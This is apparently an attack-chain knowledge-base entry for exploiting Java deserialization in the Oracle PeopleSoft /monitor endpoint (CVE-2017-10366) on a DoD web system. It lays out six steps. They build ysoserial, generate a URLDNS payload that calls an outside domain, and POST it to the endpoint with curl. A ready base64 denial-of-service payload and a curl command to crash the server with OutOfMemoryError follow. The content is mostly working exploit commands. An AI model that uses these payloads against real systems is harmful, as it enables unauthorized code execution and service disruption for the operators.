---
id: ac-java-deserialization-rce-peoplesoft
tags:
  - rce
  - deserialization
  - java
  - peoplesoft
  - ysoserial
  - dos
type: attack_chain
tools:
  - '[[tools/ysoserial]]'
  - '[[tools/git]]'
  - '[[tools/mvn]]'
  - '[[tools/curl]]'
  - '[[tools/base64]]'
  - '[[tools/BIND]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Impact]]'
verified: false
platforms:
  - Web
  - Java
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Prepare-Ysoserial-Tool]]'
  - '[[procedures/Generate-DNS-Lookup-Payload]]'
  - '[[procedures/Send-RCE-Payload-to-Endpoint]]'
  - '[[procedures/Verify-Execution-with-DNS-Logs]]'
  - '[[procedures/Generate-DoS-Deserialization-Payload]]'
  - '[[procedures/Send-DoS-Payload-to-Endpoint]]'
step_count: 6
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Client Execution]]'
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:23:27.745Z'
description: >-
  Multi-stage attack exploiting a Java object deserialization vulnerability in
  the Oracle PeopleSoft platform's monitor service, leading to remote code
  execution and denial of service.
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Client Execution]]'
  - '[[Endpoint Denial of Service]]'
---
# Remote Code Execution via Java Deserialization in Oracle PeopleSoft Monitor Service

Multi-stage attack chain demonstrating exploitation of a Java object deserialization vulnerability (CWE-502, CVE-2017-10366) in the Oracle PeopleSoft platform's 'monitor' service, used by a DoD web system. The attack identifies an exposed /monitor endpoint that deserializes untrusted data without validation, allowing arbitrary gadget chains for remote code execution (RCE) via DNS lookups or denial of service (DoS) through resource exhaustion like OutOfMemoryError.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 6 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Prepare Tool] --> B[Generate RCE Payload]
    B --> C[Send RCE Payload]
    C --> D[Verify Execution]
    D --> E[Generate DoS Payload]
    E --> F[Send DoS Payload]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#27ae60
    style E fill:#f39c12
    style F fill:#e74c3c
```

## Prerequisites & Requirements

### Required Tools

- [[tools/ysoserial]]
- [[tools/git]]
- [[tools/mvn]]
- [[tools/curl]]
- [[tools/base64]]
- [[tools/BIND]]

### Target Environment

- Oracle PeopleSoft platform with exposed /monitor endpoint
- Java-based web service (e.g., DoD system at https://target/monitor/EXPROD_1)
- No authentication required for the endpoint
- Network access to the target URL

### Initial Access Requirements

- Publicly accessible HTTPS endpoint
- Attacker-controlled DNS server for verification
- No prior credentials needed; exploits unauthenticated deserialization

## Detailed Attack Procedures

### Step 1: Prepare Ysoserial Tool
procedure: [[procedures/Prepare-Ysoserial-Tool]]

**Objective**: Clone and build the ysoserial tool to generate deserialization payloads.

**Instructions**: Use [[commands/git-clone-ysoserial]] to clone the repository:

```bash
git clone https://github.com/frohoff/ysoserial.git
```

Then navigate and build with [[commands/mvn-build-ysoserial]]:

```bash
cd ysoserial
mvn clean package –DskipTests
cd target
```

**Expected Output**: Ysoserial JAR file built in the target directory.

**Success Indicators**:
- Repository cloned successfully
- Maven build completes without errors
- JAR file (ysoserial-0.0.6-SNAPSHOT-all.jar) available

### Step 2: Generate DNS Lookup Payload
procedure: [[procedures/Generate-DNS-Lookup-Payload]]

**Objective**: Create a serialized Java object payload that triggers a DNS lookup for RCE confirmation.

**Instructions**: Execute [[commands/java-generate-urldns-payload]] to produce the payload file:

```bash
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://testing1.jexboss.info > payload
```

**Expected Output**: Binary serialized object saved to 'payload' file.

**Success Indicators**:
- Payload file generated (non-empty binary)
- No Java errors during generation

### Step 3: Send RCE Payload to Endpoint
procedure: [[procedures/Send-RCE-Payload-to-Endpoint]]

**Objective**: Deliver the payload to the vulnerable /monitor endpoint to trigger deserialization and RCE.

**Instructions**: Use [[commands/curl-send-rce-payload]] to POST the payload:

```bash
curl https://█████████/monitor/EXPROD_1 --data-binary @payload -k
```

**Expected Output**: HTTP response from the server; deserialization occurs silently.

**Success Indicators**:
- HTTP request succeeds (200 or similar)
- No immediate errors in curl output

### Step 4: Verify Execution with DNS Logs
procedure: [[procedures/Verify-Execution-with-DNS-Logs]]

**Objective**: Confirm payload execution by observing DNS queries on the attacker's controlled server.

**Instructions**: Monitor [[tools/BIND]] logs for incoming queries to the controlled domain (testing1.jexboss.info). No command execution needed; observation only.

**Expected Output**: DNS query logged from the target server.

**Success Indicators**:
- DNS lookup for testing1.jexboss.info appears in BIND logs
- Query originates from target's IP

### Step 5: Generate DoS Deserialization Payload
procedure: [[procedures/Generate-DoS-Deserialization-Payload]]

**Objective**: Create a payload that causes infinite object creation leading to memory exhaustion.

**Instructions**: Decode the base64-encoded DoS payload using [[commands/echo-decode-dos-payload]]:

```bash
echo -n "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3" | base64 -d > payload_dos
```

**Expected Output**: Binary DoS payload saved to 'payload_dos' file.

**Success Indicators**:
- Payload file created (binary content)
- Base64 decoding succeeds without errors

### Step 6: Send DoS Payload to Endpoint
procedure: [[procedures/Send-DoS-Payload-to-Endpoint]]

**Objective**: Deliver the DoS payload to exhaust server memory (use cautiously in PoC).

**Instructions**: POST the DoS payload with [[commands/curl-send-dos-payload]]:

```bash
curl https://███████/monitor/EXPROD_1 --data-binary @payload_dos -k
```

**Expected Output**: Server responds initially, then crashes with OutOfMemoryError.

**Success Indicators**:
- HTTP request sent successfully
- Target service becomes unavailable (DoS confirmed)

## Attack Chain Summary

### Key Achievements

1. Successful RCE demonstration via DNS exfiltration without direct code execution.
2. Preparation of DoS payload for service disruption.
3. Exploitation of unauthenticated deserialization in a production DoD system.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Exploitation for Client Execution]]
- [[Endpoint Denial of Service]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Impact]]

---
*Last updated: 2023-10-01T00:00:00Z*
